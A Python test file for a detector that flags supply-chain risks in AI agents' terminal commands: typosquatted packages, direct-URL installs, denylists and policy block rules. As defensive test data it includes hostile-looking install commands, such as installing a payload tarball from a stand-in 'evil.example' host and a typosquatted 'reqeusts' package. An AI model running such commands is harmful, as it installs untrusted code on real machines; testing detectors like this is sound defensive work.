from sluice.config.schema import (
    PolicyConfig,
    PolicyRule,
    SluiceConfig,
    SupplyChainDetectorConfig,
)
from sluice.detectors.base import ScanContext
from sluice.detectors.supply_chain import (
    SupplyChainDetector,
    _damerau_levenshtein,
    _typosquat_of,
    configure,
    parse_installs,
)
from sluice.policy.engine import bootstrap_detectors, evaluate


def _ctx() -> ScanContext:
    return ScanContext("request", "tools/call", "run_terminal_cmd", "demo")


def setup_function() -> None:
    configure(SupplyChainDetectorConfig(enabled=True))
    bootstrap_detectors()


def test_damerau_catches_transposition():
    assert _damerau_levenshtein("reqeusts", "requests", 1) == 1
    assert _typosquat_of("reqeusts", "pypi", 1) == "requests"
    assert _typosquat_of("requests", "pypi", 1) is None


def test_parse_pip_npm_cargo_and_urls():
    text = (
        'pip install reqeusts && npm i lodash && cargo add serde && '
        'pip install git+https://github.com/evil/pkg && pip install -r requirements.txt'
    )
    specs = parse_installs(text)
    kinds = {(s.kind, s.name or s.specifier) for s in specs}
    assert ("package", "reqeusts") in kinds
    assert ("package", "lodash") in kinds
    assert ("package", "serde") in kinds
    assert any(s.kind == "url" for s in specs)
    assert any(s.kind == "requirements" for s in specs)


def test_typosquat_and_direct_url_hits():
    detector = SupplyChainDetector()
    hits = detector.scan('{"command":"pip install reqeusts"}', _ctx())
    assert any(h.detector_id == "supply_chain.typosquat" for h in hits)
    assert any(h.detector_id == "supply_chain.install" for h in hits)

    url_hits = detector.scan(
        '{"command":"npm install https://evil.example/payload.tgz"}',
        _ctx(),
    )
    assert any(h.detector_id == "supply_chain.direct_url" for h in url_hits)


def test_denylist_and_allowlist():
    configure(
        SupplyChainDetectorConfig(
            enabled=True,
            denylist=["evilpkg"],
            allowlist=["requests"],
        )
    )
    detector = SupplyChainDetector()
    denied = detector.scan('pip install evilpkg', _ctx())
    assert any(h.detector_id == "supply_chain.denylist" for h in denied)

    allowed = detector.scan('pip install requests', _ctx())
    assert allowed == []


def test_ignores_responses_and_local_paths():
    detector = SupplyChainDetector()
    resp = detector.scan(
        "pip install reqeusts",
        ScanContext("response", "tools/call", "run", "demo"),
    )
    assert resp == []
    local = detector.scan("pip install -e ./mypkg", _ctx())
    assert local == []


def test_policy_blocks_typosquat_and_flags_generic_install():
    cfg = SluiceConfig(
        upstreams=[{"name": "demo", "transport": "http", "url": "http://localhost:1"}],
        policy=PolicyConfig(
            rules=[
                PolicyRule(detector="supply_chain.direct_url", action="block"),
                PolicyRule(detector="supply_chain.typosquat", action="block"),
                PolicyRule(detector="supply_chain.*", action="flag"),
            ]
        ),
    )
    _, squat, _ = evaluate('pip install reqeusts', _ctx(), cfg)
    assert squat is not None
    assert squat.action == "block"
    assert "typosquat" in squat.rule

    _, flagged, _ = evaluate('pip install leftpad-xyz-not-popular', _ctx(), cfg)
    assert flagged is not None
    assert flagged.action == "flag"
    assert "supply_chain.install" in flagged.detectors


def test_redact_rule_rejected_for_supply_chain():
    import pytest

    with pytest.raises(ValueError, match="supply_chain"):
        PolicyConfig(
            rules=[PolicyRule(detector="supply_chain.*", action="redact")]
        )


def test_network_tier_opt_in(monkeypatch):
    configure(
        SupplyChainDetectorConfig(
            enabled=True,
            use_osv=True,
            min_package_age_days=30,
            check_maintainers=True,
            check_install_hooks=True,
        )
    )
    import sluice.detectors.supply_chain as sc

    monkeypatch.setattr(sc, "lookup_osv", lambda eco, name: True)
    monkeypatch.setattr(sc, "lookup_github_advisories", lambda eco, name: False)
    monkeypatch.setattr(sc, "package_age_days", lambda eco, name: 2)
    monkeypatch.setattr(sc, "is_single_maintainer", lambda eco, name: True)
    monkeypatch.setattr(sc, "has_install_hooks", lambda eco, name: True)

    hits = SupplyChainDetector().scan("pip install brandnewpkg", _ctx())
    ids = {h.detector_id for h in hits}
    assert "supply_chain.cve" in ids
    assert "supply_chain.young_package" in ids
    assert "supply_chain.single_maintainer" in ids
    assert "supply_chain.install_hook" in ids


def test_network_disabled_by_default(monkeypatch):
    configure(SupplyChainDetectorConfig(enabled=True))
    import sluice.detectors.supply_chain as sc

    monkeypatch.setattr(
        sc, "lookup_osv", lambda eco, name: (_ for _ in ()).throw(AssertionError("osv"))
    )
    hits = SupplyChainDetector().scan("pip install brandnewpkg", _ctx())
    assert all(h.detector_id in {"supply_chain.install"} for h in hits)
